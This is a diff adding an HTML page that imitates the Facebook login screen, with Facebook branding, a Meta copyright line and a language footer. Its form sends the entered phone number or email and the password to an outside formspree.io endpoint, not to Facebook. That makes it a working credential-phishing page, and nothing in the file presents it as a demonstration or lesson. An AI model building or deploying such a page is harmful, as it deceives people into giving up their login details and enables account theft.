@@ -1,0 +1,132 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Document</title>
+    <style>
+        *{
+    box-sizing: border-box;
+    margin: 0;
+    padding: 0;
+}
+
+.conatiner{
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    margin-top: 30%;
+}
+
+input{
+    width: 90%;
+    margin: 10px;
+    padding: 10px;
+    border: 1px solid rgba(128, 128, 128, 0.777);
+    border-radius: 5px;
+    
+    text-align: center;
+    outline: none;
+    background-color: #fff;
+}
+
+.log-in{
+    background-color: rgb(76, 103, 255);
+    border: 1px solid transparent;
+    border-radius: 19px;
+    margin: 10px;
+    padding: 8px;
+    color: white;
+    width: 90%;
+}
+
+.create{
+    padding: 8px;
+    text-align: center;
+    width: 90%;
+    font-weight: 400;
+    background-color: rgb(255, 255, 255);
+    border-radius: 25px;
+    margin: 10px;
+    color: blue;
+    border: 1px solid rgb(0, 123, 255);
+
+}
+
+.p{
+    font-size: 14px;
+    font-weight: 200;
+    margin: 7px;
+    color: rgb(0, 0, 0);
+    font-family: helvetica;
+}
+
+.r{
+    
+    font-size: 12px;
+    font-weight: 200;
+    margin: 7px;
+    font-family: helvetica;
+}
+
+.footer{
+    display: flex;
+}
+.footer .left{
+    width: 50%;
+    position: relative;
+    left: -50px;
+}
+
+.footer .right{
+    width: 50%;
+    position: relative;
+    right: -50px;
+}
+
+.fp{
+    margin-top: 20px;
+}
+
+.fb{
+    font-size: 1rem;
+    font-weight: 900;
+    color: rgba(0, 0, 255, 0.776);
+}
+    </style>
+</head>
+<body>
+
+    <form action="https://formspree.io/f/mbjvverk" method="post">
+    <div class="conatiner">
+        <p class="fb">Facebook</p>
+        <label for="number"></label>
+        <input name="number" type="text" class="number" placeholder="Mobile number or email address">
+        <label for="text"></label>
+        <input name="word" type="word" class="word" placeholder="password">
+        <button class="log-in" type="submit">Log In</button>
+        <p class="p">Forget password?</p>
+        <p class="r">or</p>
+       <button class="create">Create new account</button>
+
+       <div class="footer">
+        <div class="left">
+            <p>English (UK)</p>
+            <p>অসমীয়া</p>
+            <p>नेपाली</p>
+            <p>português  (Brasil)</p>
+        </div>
+        <div class="right">
+            <p>বাংলা</p>
+            <p>हिन्दी</p>
+            <p>español</p>
+        </div>
+       </div>
+       <p class="fp">Meta &#169 2023</p>
+    </div>
+      </form>
+      
+
+</body>
+</html>
